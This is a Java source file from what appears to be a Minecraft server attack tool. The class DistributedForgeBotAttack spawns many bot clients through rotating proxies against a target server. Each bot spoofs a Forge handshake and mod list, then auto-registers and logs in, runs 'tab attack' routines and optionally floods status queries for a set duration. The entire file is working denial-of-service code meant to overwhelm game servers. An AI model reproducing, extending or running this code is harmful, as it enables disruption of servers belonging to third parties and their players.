package me.alikomi.endminecraft.tasks.attack.forge;

import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.Setter;
import me.alikomi.endminecraft.tasks.attack.utils.Attack_util;
import me.alikomi.endminecraft.tasks.attack.utils.DistributedAttack;
import me.alikomi.endminecraft.utils.Util;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import java.lang.reflect.InvocationTargetException;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.*;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

@RequiredArgsConstructor
@Getter

public class DistributedForgeBotAttack extends Util implements DistributedAttack {

    //全参数构造
    private final String ip;
    private final int port;
    private final long time;
    private final int sleepTime;
    private final Map<String, Proxy.Type> ips;
    private final boolean tab;
    private final boolean lele;
    private final Map<String, String> modlist;

    @Getter
    private Lock lock = new ReentrantLock();
    @Getter
    private List<String> ipsKey;
    @Setter
    @Getter
    private HashMap<String, Client> connects = new HashMap<>();
    @Setter
    @Getter
    private boolean isAttack = true;
    private int index = 0;
    private boolean yy = false;
    private Attack_util attack_util;
    private DistributedAttack distributedAttack;

    public void startAttack() {
        distributedAttack = this;
        attack_util = new Attack_util(distributedAttack);
        ipsKey = Arrays.asList(ips.keySet().toArray(new String[ips.size()]));
        log("代理数量： " + ips.size(), "正在初始化...");
        log("代理数量： " + ips.size(), "正在初始化...");
        attack_util.start(
                attack_util.init()
        );
        attack_util.clearThread();
        attack_util.getPlayersThread();
        attack_util.checkAddPlayersThread();
        try {
            Thread.sleep(time);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        isAttack = false;
        for (Client conn : connects.values()) {
            if (conn.getSession().isConnected())
                conn.getSession().disconnect("Timeout，停止攻击");
        }
    }

    public Client start(Proxy.Type tp, String po) {
        MinecraftProtocol mc = new MinecraftProtocol(getRandomString(new Random().nextInt(9) % (9 - 4 + 1) + 4));
        Proxy proxy = new Proxy(tp, new InetSocketAddress(po.split(":")[0], Integer.parseInt(po.split(":")[1])));
        final Client client = new Client(ip, port, mc, new TcpSessionFactory(proxy));
        ForgeHandShake forgeHandShake = new ForgeHandShake(client, modlist);
        client.getSession().addListener(new SessionListener() {
            public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
                if (packetReceivedEvent.getPacket() instanceof ServerPluginMessagePacket) {
                    try {
                        forgeHandShake.start(packetReceivedEvent.getPacket());
                    } catch (InvocationTargetException | NoSuchMethodException | IllegalAccessException | NoSuchFieldException e) {
                        e.printStackTrace();
                    }
                }
                if (packetReceivedEvent.getPacket() instanceof ServerJoinGamePacket) {
                    Attack_util.regAndLogin(client);
                    Attack_util.startTabAttack(client, distributedAttack);
                }
            }

            public void packetSent(PacketSentEvent packetSentEvent) {

            }

            public void connected(ConnectedEvent connectedEvent) {

            }

            public void disconnecting(DisconnectingEvent disconnectingEvent) {

            }

            public void disconnected(DisconnectedEvent disconnectedEvent) {
                String msg = disconnectedEvent.getReason();
                if (msg.contains("refused") || msg.contains("here") || !isAttack) return;
                Throwable t = disconnectedEvent.getCause();
                log("用户 " + mc.getProfile().getName() + "断开连接： " + msg + (t == null ? "" : t.toString()));
            }
        });
        if (lele) new Thread(() -> getMotd(proxy, ip, port)).start();
        return client;
    }
}